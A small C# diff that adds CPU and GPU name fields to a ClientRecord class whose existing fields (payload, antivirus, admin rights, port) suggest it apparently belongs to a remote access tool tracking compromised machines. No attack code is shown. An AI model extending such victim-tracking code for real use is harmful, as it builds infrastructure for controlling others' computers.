@@ -14,6 +14,8 @@ public class ClientRecord
     public string LastOS        { get; set; } = string.Empty;
     public string LastPayload   { get; set; } = string.Empty;
     public string LastAntivirus { get; set; } = string.Empty;
+    public string LastCpuName   { get; set; } = string.Empty;
+    public string LastGpuName   { get; set; } = string.Empty;
     public bool   LastIsAdmin   { get; set; }
     public int    LastPort { get; set; }
     public string Tag { get; set; } = string.Empty;
